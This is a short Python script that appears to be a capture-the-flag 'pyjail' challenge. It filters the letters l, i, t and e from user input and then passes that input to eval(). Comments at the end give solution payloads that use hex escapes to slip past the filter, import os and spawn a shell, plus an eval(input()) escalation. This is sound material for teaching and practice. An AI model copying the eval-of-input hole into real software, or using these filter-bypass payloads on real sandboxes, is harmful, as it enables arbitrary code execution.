expr = input("Input syntax to get shell / bash:\n; ")
blacklist = list("lite")

if len(expr) > 100:
    print("TOO LONG!")
    exit()

for char in expr:
    for c in blacklist:
        if char == c:
            print(f"u cant use \"{char}\"")
            exit()
        # if len(expr) > 100:
        #     print("TOO LONG!")
        #     exit()
        # else:
        #     if char == c:
        #         print(f"u cant use \"{char}\"")
        #         exit()
eval(expr)

# payload
# vars(vars(vars()["__bu\x69\x6c\x74\x69ns__"])['__\x69mpor\x74__']('os'))['sys\x74\x65m']('sh')
# vars(vars(vars()["__bu\x69\x6c\x74\x69ns__"])['__\x69mport__']('os'))['sys\x74\x65m']('sh')

# '\x65va\x6c("\x69npu\x74()")'